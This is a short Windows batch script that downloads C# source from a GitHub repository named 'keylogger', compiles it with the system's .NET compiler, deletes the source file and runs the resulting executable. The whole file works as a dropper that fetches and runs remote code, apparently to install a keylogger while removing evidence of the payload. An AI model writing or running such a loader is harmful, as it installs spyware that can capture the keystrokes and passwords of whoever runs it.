@echo off
curl -O https://raw.githubusercontent.com/w3irdguy/keylogger/main/exploitreal.cs
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe exploitreal.cs
erase exploitreal.cs & exploitreal.exe
